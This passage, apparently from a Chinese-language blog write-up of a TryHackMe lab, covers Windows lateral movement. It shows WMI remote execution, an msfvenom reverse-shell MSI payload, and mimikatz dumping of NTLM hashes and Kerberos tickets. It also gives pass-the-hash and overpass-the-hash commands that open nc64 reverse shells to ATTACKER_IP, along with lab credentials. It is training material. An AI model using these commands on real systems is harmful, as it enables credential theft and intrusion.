<p>在旧系统上，可以在命令提示符下使用 wmic 完成相同的操作：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">wmic<span class="hljs-selector-class">.exe</span> /user:Administrator /password:Mypass123 /node:TARGET process call create <span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span> <br></code></pre></td></tr></table></figure>
<h2 id="使用-WMI-远程创建服务"><a href="#使用-WMI-远程创建服务" class="headerlink" title="使用-WMI-远程创建服务"></a>使用 WMI 远程创建服务</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>我们可以通过Powershell使用WMI创建服务。要创建名为 THMService2 的服务，我们可以使用以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Service <span class="hljs-literal">-MethodName</span> Create <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<br>Name = <span class="hljs-string">&quot;THMService2&quot;</span>;<br>DisplayName = <span class="hljs-string">&quot;THMService2&quot;</span>;<br>PathName = <span class="hljs-string">&quot;net user munra2 Pass123 /add&quot;</span>; <span class="hljs-comment"># Your payload</span><br>ServiceType = [<span class="hljs-built_in">byte</span>]::Parse(<span class="hljs-string">&quot;16&quot;</span>); <span class="hljs-comment"># Win32OwnProcess : Start service in a new process</span><br>StartMode = <span class="hljs-string">&quot;Manual&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>然后，我们可以获取该服务的句柄并使用以下命令启动它：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$Service</span> = <span class="hljs-built_in">Get-CimInstance</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Service <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;Name LIKE &#x27;THMService2&#x27;&quot;</span><br><br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> StartService<br></code></pre></td></tr></table></figure>
<p>最后，我们可以使用以下命令停止并删除该服务：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> StopService<br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> Delete<br></code></pre></td></tr></table></figure>
<h2 id="使用-WMI-远程创建计划任务"><a href="#使用-WMI-远程创建计划任务" class="headerlink" title="使用-WMI-远程创建计划任务"></a>使用 WMI 远程创建计划任务</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>我们可以使用 Windows 默认安装中提供的一些 cmdlet 创建并执行计划任务：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Payload must be split in Command and Args</span><br><span class="hljs-variable">$Command</span> = <span class="hljs-string">&quot;cmd.exe&quot;</span><br><span class="hljs-variable">$Args</span> = <span class="hljs-string">&quot;/c net user munra22 aSdf1234 /add&quot;</span><br><br><span class="hljs-variable">$Action</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-Execute</span> <span class="hljs-variable">$Command</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$Args</span><br><span class="hljs-built_in">Register-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Action</span> <span class="hljs-literal">-User</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">&quot;THMtask2&quot;</span><br><span class="hljs-built_in">Start-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">&quot;THMtask2&quot;</span><br></code></pre></td></tr></table></figure>
<p>要在使用完计划任务后将其删除，我们可以使用以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Unregister-ScheduledTask</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-TaskName</span> <span class="hljs-string">&quot;THMtask2&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="WMI-通过-WMI-安装-MSI-包"><a href="#WMI-通过-WMI-安装-MSI-包" class="headerlink" title="WMI-通过-WMI-安装-MSI-包"></a>WMI 通过 WMI 安装 MSI 包</h2>
<ul>
<li>Ports:
<ul>
<li>135/TCP, 49152-65535/TCP (DCERPC)</li>
<li>5985/TCP (WinRM HTTP) 或 5986/TCP (WinRM HTTPS)</li>
</ul>
</li>
<li>所需的组成员身份：管理员</li>
</ul>
<p>MSI 是一种用于安装程序的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以通过任何可用的方式复制该文件。一旦 MSI 文件位于目标系统中，我们就可以尝试通过 WMI 调用 Win32_Product 类来安装它：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Product <span class="hljs-literal">-MethodName</span> Install <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;PackageLocation = <span class="hljs-string">&quot;C:\Windows\myinstaller.msi&quot;</span>; Options = <span class="hljs-string">&quot;&quot;</span>; AllUsers = <span class="hljs-variable">$false</span>&#125;<br></code></pre></td></tr></table></figure>
<p>我们可以通过在遗留系统中使用 wmic 来实现相同的目的：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">wmic /node<span class="hljs-selector-pseudo">:TARGET</span> /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi<br></code></pre></td></tr></table></figure>
<h2 id="实践练习-2"><a href="#实践练习-2" class="headerlink" title="实践练习-2"></a>实践练习</h2>
<p>对于本练习，我们假设我们已经捕获了一些具有管理访问权限的凭据：</p>
<p>用户：<a target="_blank" rel="noopener" href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t1_corine.waters</p>
<p><strong>Password:</strong> Korine.1994</p>
<p>我们将展示如何使用这些凭据通过 WMI 和 MSI 包横向移动到 THM-IIS。请随意尝试此任务中介绍的其他方法。</p>
<p>我们将首先从攻击者机器上使用 msfvenom 创建 MSI 有效负载：</p>
<p>注意：由于您将与其他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myinstaller.msi”，以避免覆盖其他人的有效负载。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span> LPORT=<span class="hljs-number">5555</span> -f msi &gt; bcxinstaller<span class="hljs-selector-class">.msi</span><br></code></pre></td></tr></table></figure>
<p>然后，我们使用 SMB 或任何其他可用的方法复制有效负载：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">smbclient -c &#x27;put bcxinstaller<span class="hljs-selector-class">.msi</span>&#x27; -U t1_corine<span class="hljs-selector-class">.waters</span> -W ZA &#x27;<span class="hljs-comment">//thmiis.za.tryhackme.com/admin$/&#x27; Korine.1994</span><br></code></pre></td></tr></table></figure>
<p>由于我们将有效负载复制到 ADMIN$ 共享，因此它将在服务器上的 C:\Windows\ 中可用。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216140108272.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216140108272.png" alt="image-20240216140108272"></p>
<p>我们启动一个处理程序来接收来自 Metasploit 的反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set LHOST <span class="hljs-number">10.50</span><span class="hljs-selector-class">.46</span><span class="hljs-selector-class">.236</span><br>msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set LPORT <span class="hljs-number">5555</span><br>msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set payload windows/x64/shell_reverse_tcp<br>msf6 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; exploit <br></code></pre></td></tr></table></figure>
<p>让我们从 Powershell 控制台启动针对 THMIIS 的 WMI 会话：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">PS C:\&gt; <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;t1_corine.waters&#x27;</span>;<br>PS C:\&gt; <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Korine.1994&#x27;</span>;<br>PS C:\&gt; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force;<br>PS C:\&gt; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;<br>PS C:\&gt; <span class="hljs-variable">$Opt</span> = New-CimSessionOption -Protocol DCOM<br>PS C:\&gt; <span class="hljs-variable">$Session</span> = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential <span class="hljs-variable">$credential</span> -SessionOption <span class="hljs-variable">$Opt</span> -ErrorAction Stop<br></code></pre></td></tr></table></figure>
<p>然后，我们从 Win32_Product 类调用 Install 方法来触发有效负载：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">PS C:\&gt; Invoke-CimMethod -CimSession <span class="hljs-variable">$Session</span> -ClassName Win32_Product -MethodName Install -Arguments @&#123;PackageLocation = &quot;C:\Windows\bcxinstaller.msi<span class="hljs-string">&quot;; Options = &quot;</span><span class="hljs-string">&quot;; AllUsers = $false&#125;</span><br></code></pre></td></tr></table></figure>
<p>因此，您应该在 AttackBox 中收到一个连接，您可以通过该连接访问 t1_corine.waters 桌面上的标志。</p>
<h1>0x05 使用替代认证材料</h1>
<p>通过替代身份验证材料，我们指的是可用于访问 Windows 帐户而无需实际知道用户密码本身的任何数据。这是可能的，因为 Windows 网络使用的某些身份验证协议的工作方式。在此任务中，我们将研究当网络上存在以下任一身份验证协议时可作为用户登录的几种替代方案：</p>
<ul>
<li>NTLM认证</li>
<li>Kerberos 身份验证</li>
</ul>
<p>注意：在此任务中，假定您熟悉从主机提取凭据的方法和工具。 Mimikatz 将被用作整个房间中凭证提取的首选工具。</p>
<h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2>
<p>在深入研究实际的横向移动技术之前，我们先看一下 NTLM 身份验证的工作原理：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216145026235.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216145026235.png" alt="image-20240216145026235"></p>
<ol>
<li>客户端向他们想要访问的服务器发送身份验证请求。</li>
<li>服务器生成一个随机数并将其作为质询发送给客户端。</li>
<li>客户端将其 NTLM 密码哈希与质询（以及其他已知数据）结合起来，生成对质询的响应，并将其发送回服务器进行验证。</li>
<li>服务器将质询和响应转发给域控制器进行验证。</li>
<li>域控制器使用质询重新计算响应并将其与客户端发送的初始响应进行比较。如果两者匹配，则客户端通过身份验证；否则，访问将被拒绝。认证结果发送回服务器。</li>
<li>服务器将认证结果转发给客户端。</li>
</ol>
<p>注意：所描述的过程适用于使用域帐户时。如果使用本地帐户，服务器可以验证对质询本身的响应，而无需与域控制器交互，因为它的 SAM 上本地存储有密码哈希值。</p>
<h2 id="传递哈希值"><a href="#传递哈希值" class="headerlink" title="传递哈希值"></a>传递哈希值</h2>
<p>从我们获得管理权限的主机中提取凭据（通过使用 mimikatz 或类似工具）后，我们可能会获得可以轻松破解的明文密码或哈希值。然而，如果我们不够幸运，我们最终会得到未破解的 NTLM 密码哈希值。</p>
<p>尽管我们似乎无法真正使用这些哈希值，但只需知道密码哈希值即可响应身份验证期间发送的 NTLM 质询。这意味着我们可以在不需要知道明文密码的情况下进行身份验证。如果 Windows 域配置为使用 NTLM 身份验证，则无需破解 NTLM 哈希值，我们就可以传递哈希值 (PtH) 并成功进行身份验证。</p>
<p>要提取 NTLM 哈希值，我们可以使用 mimikatz 读取本地 SAM 或直接从 LSASS 内存中提取哈希值。</p>
<h3 id="从本地-SAM-中提取-NTLM-哈希值"><a href="#从本地-SAM-中提取-NTLM-哈希值" class="headerlink" title="从本地-SAM-中提取-NTLM-哈希值"></a>从本地 SAM 中提取 NTLM 哈希值</h3>
<p>此方法仅允许您从计算机上的本地用户获取哈希值。没有域用户的哈希值可用。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # privilege::debug<br>mimikatz # token::elevate<br><br>mimikatz # lsadump::sam   <br>RID  : <span class="hljs-number">000001</span>f4 (<span class="hljs-number">500</span>)<br>User : Administrator<br>  Hash NTLM: <span class="hljs-number">145</span>e02c50333951f71d13c245d352b50<br></code></pre></td></tr></table></figure>
<h3 id="从-LSASS-内存中提取-NTLM-哈希值"><a href="#从-LSASS-内存中提取-NTLM-哈希值" class="headerlink" title="从-LSASS-内存中提取-NTLM-哈希值"></a>从 LSASS 内存中提取 NTLM 哈希值</h3>
<p>此方法将允许您提取本地用户和最近登录到计算机的任何域用户的任何 NTLM 哈希值。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # privilege::debug<br>mimikatz # token::elevate<br><br>mimikatz # sekurlsa::msv <br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">308124</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0004</span>b39c)<br>Session           : RemoteInteractive from <span class="hljs-number">2</span> <br>User Name         : bob.jenkins<br>Domain            : ZA<br>Logon Server      : THMDC<br>Logon Time        : <span class="hljs-number">2022</span>/<span class="hljs-number">04</span>/<span class="hljs-number">22</span> <span class="hljs-number">09</span>:<span class="hljs-number">55</span>:<span class="hljs-number">02</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3330634377</span>-<span class="hljs-number">1326264276</span>-<span class="hljs-number">632209373</span>-<span class="hljs-number">4605</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : bob.jenkins<br>         * Domain   : ZA<br>         * NTLM     : <span class="hljs-number">6</span>b4a57f67805a663c818106dc0648484<br></code></pre></td></tr></table></figure>
<p>然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # token::revert<br>mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:<span class="hljs-number">6</span>b4a57f67805a663c818106dc0648484 /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;</span><br></code></pre></td></tr></table></figure>
<p>请注意，我们使用 <code>token::revert</code> 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。</p>
<p>这相当于使用 <code>runas /netonly</code> 但使用哈希而不是密码，并将生成一个新的反向 shell，我们可以从其中以受害者用户身份启动任何命令。</p>
<p>要接收反向 shell，我们应该在 AttackBox 上运行反向侦听器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">nc -lvp <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure>
<p>有趣的是，如果您在此 shell 上运行 whoami 命令，它仍然会显示您在执行 PtH 之前使用的原始用户，但从这里运行的任何命令实际上都会使用我们使用 PtH 注入的凭据。</p>
<h3 id="使用-Linux-传递哈希"><a href="#使用-Linux-传递哈希" class="headerlink" title="使用-Linux-传递哈希"></a>使用 Linux 传递哈希</h3>
<p>如果您可以访问 Linux 盒子（如 AttackBox），有几个工具具有内置支持，可以使用不同的协议执行 PtH。根据您可以使用的服务，您可以执行以下操作：</p>
<p>使用 PtH 连接到 RDP：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH<br></code></pre></td></tr></table></figure>
<p>使用 PtH 通过 psexec 连接：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">psexec<span class="hljs-selector-class">.py</span> -hashes NTLM_HASH DOMAIN/MyUser<span class="hljs-keyword">@VICTIM</span>_IP<br></code></pre></td></tr></table></figure>
<p>注意：仅 Linux 版本的 psexec 支持 PtH。</p>
<p>使用 PtH 连接到 WinRM：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">evil-winrm -<span class="hljs-selector-tag">i</span> VICTIM_IP -u MyUser -H NTLM_HASH<br></code></pre></td></tr></table></figure>
<h2 id="Kerberos-身份验证"><a href="#Kerberos-身份验证" class="headerlink" title="Kerberos-身份验证"></a>Kerberos 身份验证</h2>
<p>让我们快速了解一下 Kerberos 身份验证在 Windows 网络上的工作原理：</p>
<ol>
<li>
<p>用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到密钥分发中心 (KDC)，该服务通常安装在域控制器上，负责在网络上创建 Kerberos 票证。</p>
<p>KDC 将创建并发回票证授予票证 (TGT)，允许用户请求票证来访问特定服务，而无需将其凭据传递给服务本身。与 TGT 一起，还将向用户提供会话密钥，用户将需要该会话密钥来生成后续请求。</p>
<p>请注意，TGT 使用 krbtgt 帐户的密码哈希进行加密，因此用户无法访问其内容。重要的是要知道加密的 TGT 包括会话密钥的副本作为其内容的一部分，并且 KDC 不需要存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本。</p>
</li>
</ol>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150118868.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150118868.png" alt="image-20240216150118868"></p>
<ol start="2">
<li>
<p>当用户想要连接到网络上的服务（例如共享、网站或数据库）时，他们将使用 TGT 向 KDC 请求票证授予服务 (TGS)。 TGS 是只允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送他的用户名和使用会话密钥加密的时间戳，以及 TGT 和服务主体名称 (SPN)，该名称指示我们打算访问的服务和服务器名称。</p>
<p>因此，KDC 将向我们发送 TGS 和服务会话密钥，我们需要对我们想要访问的服务进行身份验证。 TGS 使用服务所有者哈希进行加密。服务所有者是运行服务的用户或计算机帐户。 TGS 在其加密内容上包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p>
</li>
</ol>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150256426.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150256426.png" alt="image-20240216150256426"></p>
<ol start="3">
<li>然后可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。</li>
</ol>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150326439.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216150326439.png" alt="image-20240216150326439"></p>
<h2 id="传票"><a href="#传票" class="headerlink" title="传票"></a>传票</h2>
<p>有时可以使用 mimikatz 从 LSASS 内存中提取 Kerberos 票证和会话密钥。该过程通常需要我们在被攻击的机器上拥有 SYSTEM 权限，可以按如下方式完成：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # privilege::debug<br>mimikatz # sekurlsa::tickets /export<br></code></pre></td></tr></table></figure>
<p>请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。</p>
<p>虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可用于请求访问允许用户访问的任何服务。同时，TGS 仅适用于特定服务。提取 TGT 需要我们拥有管理员凭据，并且可以使用低权限帐户（仅分配给该帐户的帐户）来提取 TGS。</p>
<p>一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # kerberos::ptt [<span class="hljs-number">0</span>;<span class="hljs-number">427</span>fcd5]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">40</span>e10000-Administrator<span class="hljs-keyword">@krbtgt-ZA</span>.TRYHACKME.COM.kirbi<br></code></pre></td></tr></table></figure>
<p>在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss">za\bob<span class="hljs-selector-class">.jenkins</span><span class="hljs-keyword">@THMJMP</span>2 <span class="hljs-attribute">C</span>:\&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x1e43562<br><br>Cached <span class="hljs-attribute">Tickets</span>: (<span class="hljs-number">1</span>)<br><br>#<span class="hljs-number">0</span>&gt;     <span class="hljs-attribute">Client</span>: Administrator @ ZA.TRYHACKME.COM<br>        <span class="hljs-attribute">Server</span>: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM<br>        KerbTicket Encryption <span class="hljs-attribute">Type</span>: AES-<span class="hljs-number">256</span>-CTS-HMAC-SHA1-<span class="hljs-number">96</span><br>        Ticket Flags <span class="hljs-number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize<br>        Start <span class="hljs-attribute">Time</span>: <span class="hljs-number">4</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">0</span>:<span class="hljs-number">28</span>:<span class="hljs-number">35</span> (local)<br>        End <span class="hljs-attribute">Time</span>:   <span class="hljs-number">4</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">28</span>:<span class="hljs-number">35</span> (local)<br>        Renew <span class="hljs-attribute">Time</span>: <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">0</span>:<span class="hljs-number">28</span>:<span class="hljs-number">35</span> (local)<br>        Session Key <span class="hljs-attribute">Type</span>: AES-<span class="hljs-number">256</span>-CTS-HMAC-SHA1-<span class="hljs-number">96</span><br>        Cache <span class="hljs-attribute">Flags</span>: <span class="hljs-number">0</span>x1 -&gt; PRIMARY<br>        Kdc <span class="hljs-attribute">Called</span>: THMDC.za.tryhackme.com<br></code></pre></td></tr></table></figure>
<h2 id="跨越哈希-传递密钥"><a href="#跨越哈希-传递密钥" class="headerlink" title="跨越哈希-传递密钥"></a>跨越哈希/传递密钥</h2>
<p>这种攻击与 PtH 类似，但适用于 Kerberos 网络。</p>
<p>当用户请求 TGT 时，他们会发送使用从其密码派生的加密密钥加密的时间戳。用于派生此密钥的算法可以是 DES（在当前 Windows 版本上默认禁用）、RC4、AES128 或 AES256，具体取决于安装的 Windows 版本和 Kerberos 配置。如果我们拥有这些密钥中的任何一个，我们就可以向 KDC 请求 TGT，而无需实际密码，因此得名“传递密钥”(PtK)。</p>
<p>我们可以通过使用 mimikatz 和以下命令从内存中获取 Kerberos 加密密钥：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # privilege::debug<br>mimikatz # sekurlsa::ekeys<br></code></pre></td></tr></table></figure>
<p>根据可用的密钥，我们可以在 mimikatz 上运行以下命令，以通过密钥传递来获取反向 shell（为方便起见，THMJMP2 中已提供 <code>nc64</code> ）：</p>
<p>如果我们有 RC4 哈希：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:<span class="hljs-number">96</span>ea24eff4dff1fbe13818fbf12ea7d8 /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></code></pre></td></tr></table></figure>
<p>如果我们有 AES128 哈希：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></code></pre></td></tr></table></figure>
<p>如果我们有 AES256 哈希：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</span><br></code></pre></td></tr></table></figure>
<p>请注意，使用 RC4 时，密钥将等于用户的 NTLM 哈希值。这意味着，如果我们可以提取 NTLM 哈希，只要 RC4 是启用的协议之一，我们就可以使用它来请求 TGT。这种特殊的变体通常被称为 Overpass-the-Hash (OPtH)。</p>
<p>要接收反向 shell，我们应该在 AttackBox 上运行反向侦听器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ nc -lvp <span class="hljs-number">5556</span><br></code></pre></td></tr></table></figure>
<p>就像 PtH 一样，从此 shell 运行的任何命令都将使用通过 mimikatz 注入的凭据。</p>
<h2 id="实践练习-3"><a href="#实践练习-3" class="headerlink" title="实践练习-3"></a>实践练习</h2>
<p>要开始本练习，您需要使用以下凭据通过 SSH 连接到 THMJMP2：</p>
